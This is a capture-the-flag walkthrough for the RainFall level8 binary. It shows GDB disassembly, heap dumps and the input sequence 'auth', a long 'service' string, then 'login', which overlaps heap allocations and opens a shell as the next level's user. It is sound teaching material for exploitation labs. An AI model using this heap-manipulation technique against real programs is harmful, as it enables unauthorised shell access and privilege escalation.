# Walkthrough

After finding a binary file named "level8" in the home directory and executing it, it was unclear what the program did.

```
level8@RainFall:~$ ./level8 
(nil), (nil) 
AAAA
(nil), (nil) 
BBBB
(nil), (nil) 
CCCCC
(nil), (nil) 
^C
```

 To gain a better understanding of the program's functionality, i reversed using GDB.

The reversed program begins by printing the addresses of two global variables, "auth" and "service." It then reads input from the user and stores it in a buffer.

```s
   0x08048575 <+17>: mov    ecx,DWORD PTR ds:0x8049ab0 // service
   0x0804857b <+23>: mov    edx,DWORD PTR ds:0x8049aac // auth
   0x08048581 <+29>: mov    eax,0x8048810
   0x08048586 <+34>: mov    DWORD PTR [esp+0x8],ecx
   0x0804858a <+38>: mov    DWORD PTR [esp+0x4],edx
   0x0804858e <+42>: mov    DWORD PTR [esp],eax
   0x08048591 <+45>: call   0x8048410 <printf@plt>
   0x08048596 <+50>: mov    eax,ds:0x8049a80
   0x0804859b <+55>: mov    DWORD PTR [esp+0x8],eax
   0x0804859f <+59>: mov    DWORD PTR [esp+0x4],0x80
   0x080485a7 <+67>: lea    eax,[esp+0x20]              // buffer
   0x080485ab <+71>: mov    DWORD PTR [esp],eax
   0x080485ae <+74>: call   0x8048440 <fgets@plt>

```

The program repeatedly compares the contents of the buffer with a string located at address "0x8048819" containing the word "auth," until either the strings do not match, the length of the buffer is reached, or the value of register ECX is equal to zero.

```s
   0x080485bb <+87>: lea    eax,[esp+0x20]
   0x080485bf <+91>: mov    edx,eax
   0x080485c1 <+93>: mov    eax,0x8048819
   0x080485c6 <+98>: mov    ecx,0x5
   0x080485cb <+103>: mov    esi,edx
   0x080485cd <+105>: mov    edi,eax
   0x080485cf <+107>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080485d1 <+109>: seta   dl
   0x080485d4 <+112>: setb   al
   0x080485d7 <+115>: mov    ecx,edx
   0x080485d9 <+117>: sub    cl,al
   0x080485db <+119>: mov    eax,ecx
   0x080485dd <+121>: movsx  eax,al
   0x080485e0 <+124>: test   eax,eax

```

If the comparison is equal to zero, the program allocates memory for "auth" and calculates the length of the string following the word "auth." If the length is less than or equal to 30, the program copies the string following "auth" into the global variable "auth" using the "strcpy" function.

```s
   0x080485e2 <+126>: jne    0x8048642 <main+222>
   0x080485e4 <+128>: mov    DWORD PTR [esp],0x4
   0x080485eb <+135>: call   0x8048470 <malloc@plt>
   0x080485f0 <+140>: mov    ds:0x8049aac,eax
   0x080485f5 <+145>: mov    eax,ds:0x8049aac
   0x080485fa <+150>: mov    DWORD PTR [eax],0x0
   0x08048600 <+156>: lea    eax,[esp+0x20]
   0x08048604 <+160>: add    eax,0x5
   0x08048607 <+163>: mov    DWORD PTR [esp+0x1c],0xffffffff
   0x0804860f <+171>: mov    edx,eax
   0x08048611 <+173>: mov    eax,0x0
   0x08048616 <+178>: mov    ecx,DWORD PTR [esp+0x1c]
   0x0804861a <+182>: mov    edi,edx
   0x0804861c <+184>: repnz scas al,BYTE PTR es:[edi]
   0x0804861e <+186>: mov    eax,ecx
   0x08048620 <+188>: not    eax
   0x08048622 <+190>: sub    eax,0x1
   0x08048625 <+193>: cmp    eax,0x1e
   0x08048628 <+196>: ja     0x8048642 <main+222>
   0x0804862a <+198>: lea    eax,[esp+0x20]
   0x0804862e <+202>: lea    edx,[eax+0x5]
   0x08048631 <+205>: mov    eax,ds:0x8049aac
   0x08048636 <+210>: mov    DWORD PTR [esp+0x4],edx
   0x0804863a <+214>: mov    DWORD PTR [esp],eax
   0x0804863d <+217>: call   0x8048460 <strcpy@plt>
```

If the comparison is not equal to zero, the program moves on to the next condition, which compares the buffer with the string "reset" located at address "0x804881f".

```s
   0x08048642 <+222>: lea    eax,[esp+0x20]
   0x08048646 <+226>: mov    edx,eax
   0x08048648 <+228>: mov    eax,0x804881f
   0x0804864d <+233>: mov    ecx,0x5
   0x08048652 <+238>: mov    esi,edx
   0x08048654 <+240>: mov    edi,eax
   0x08048656 <+242>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x08048658 <+244>: seta   dl
   0x0804865b <+247>: setb   al
   0x0804865e <+250>: mov    ecx,edx
   0x08048660 <+252>: sub    cl,al
   0x08048662 <+254>: mov    eax,ecx
   0x08048664 <+256>: movsx  eax,al
   0x08048667 <+259>: test   eax,eax
```

 If the comparison is equal to zero, the program frees the memory allocated for "auth."

```s
   test   eax,eax
   0x08048669 <+261>: jne    0x8048678 <main+276>
   0x0804866b <+263>: mov    eax,ds:0x8049aac
   0x08048670 <+268>: mov    DWORD PTR [esp],eax
   0x08048673 <+271>: call   0x8048420 <free@plt>

```

If not, the program moves on to the next condition, which compares the buffer with the string "service" located at address "0x8048825".

```s
   0x08048678 <+276>: lea    eax,[esp+0x20]
   0x0804867c <+280>: mov    edx,eax
   0x0804867e <+282>: mov    eax,0x8048825
   0x08048683 <+287>: mov    ecx,0x6
   0x08048688 <+292>: mov    esi,edx
   0x0804868a <+294>: mov    edi,eax
   0x0804868c <+296>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x0804868e <+298>: seta   dl
   0x08048691 <+301>: setb   al
   0x08048694 <+304>: mov    ecx,edx
   0x08048696 <+306>: sub    cl,al
   0x08048698 <+308>: mov    eax,ecx
   0x0804869a <+310>: movsx  eax,al
   0x0804869d <+313>: test   eax,eax
```

If the comparison is equal to zero, the program duplicates the contents of the buffer from the address "buffer+7" using the "strdup" function.

```s
   0x0804869f <+315>: jne    0x80486b5 <main+337>
   0x080486a1 <+317>: lea    eax,[esp+0x20]
   0x080486a5 <+321>: add    eax,0x7
   0x080486a8 <+324>: mov    DWORD PTR [esp],eax
   0x080486ab <+327>: call   0x8048430 <strdup@plt>
   0x080486b0 <+332>: mov    ds:0x8049ab0,eax
```

If the comparison is not equal to zero, the program moves on to the next condition, which compares the contents of the buffer with the string "login" located at address "0x804882d".

```s
   0x080486b5 <+337>: lea    eax,[esp+0x20]
   0x080486b9 <+341>: mov    edx,eax
   0x080486bb <+343>: mov    eax,0x804882d
   0x080486c0 <+348>: mov    ecx,0x5
   0x080486c5 <+353>: mov    esi,edx
   0x080486c7 <+355>: mov    edi,eax
   0x080486c9 <+357>: repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
   0x080486cb <+359>: seta   dl
   0x080486ce <+362>: setb   al
   0x080486d1 <+365>: mov    ecx,edx
   0x080486d3 <+367>: sub    cl,al
   0x080486d5 <+369>: mov    eax,ecx
   0x080486d7 <+371>: movsx  eax,al
   0x080486da <+374>: test   eax,eax
```

If the comparison is equal to zero, the program checks if the value of "auth" plus 32 is equal to zero. If it is, the program prints "Password:\n."

```s
   0x080486ff <+411>: mov    eax,ds:0x8049aa0
   0x08048704 <+416>: mov    edx,eax
   0x08048706 <+418>: mov    eax,0x804883b
   0x0804870b <+423>: mov    DWORD PTR [esp+0xc],edx
   0x0804870f <+427>: mov    DWORD PTR [esp+0x8],0xa
   0x08048717 <+435>: mov    DWORD PTR [esp+0x4],0x1
   0x0804871f <+443>: mov    DWORD PTR [esp],eax
   0x08048722 <+446>: call   0x8048450 <fwrite@plt>
```

If not, the program starts a new shell process using the "system" function with "/bin/sh" as a parameter.

```s
   0x080486ee <+394>: mov    DWORD PTR [esp],0x8048833
   0x080486f5 <+401>: call   0x8048480 <system@plt>
```
Finally, the program reads input from the user and repeats the same actions.

In order to obtain the flag, it is necessary to modify the value of the global variable "auth" located at [address+32]. However, there is a condition in place that checks whether the length of the string following the "auth" keyword is less than or equal to 30. 

first, I will display the contents of the heap after entering the keyword "auth" into the program.

```s
(gdb) run
Starting program: /home/user/level8/level8 
(nil), (nil) 
auth AAAABBBB
(gdb) x/16wx 0x804a000
0x804a000:      0x00000000      0x00000011      0x41414141      0x42424242
                                                    └────────────────┴───────── these addresses was filled by auth    
0x804a010:      0x0000000a      0x00020ff1      0x00000000      0x00000000

0x804a020:      0x00000000      0x00000000      0x00000000<──┐  0x00000000
                                                             └────────────────── We need to fill this address `0x804a028`
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
```

Upon inputting the keyword `service`. The strdup function will populate the memory address located at 0x804a028 with a string of characters when the input buffer is of sufficient length.


```s
(gdb) c
Continuing.
0x804a008, (nil) 
serviceAAAABBBBCCCCDDDDEEEE
(gdb) x/16wx 0x804a000
0x804a000:	0x00000000	0x00000011	0x41414141	0x42424242
0x804a010:	0x0000000a	0x00000021	0x41414141	0x42424242
0x804a020:	0x43434343	0x44444444	0x45454545	0x0000000a
0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000
(gdb) c
Continuing.
0x804a008, 0x804a018 
login
$ echo $PWD
/home/user/level8
```

After inputting the appropriate characters with the last input, it can be observed that the memory address at 0x804a028 is filled, which ultimately initiates the shell process.

At this point, all that is required is to execute the level8 program using the inputs described previously in order to retrieve the flag.

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth AAAABBBB
0x804a008, (nil) 
service AAAABBBBCCCCDDDDEEEE
0x804a008, 0x804a018 
login
$ whoami
level9
$ cd ../level9
$ ls -la
total 17
dr-xr-x---+ 1 level9 level9   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level9 level9  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level9 level9 3530 Sep 23  2015 .bashrc
-rw-r--r--+ 1 level9 level9   65 Sep 23  2015 .pass
-rw-r--r--  1 level9 level9  675 Apr  3  2012 .profile
-rwsr-s---+ 1 bonus0 users  6720 Mar  6  2016 level9
```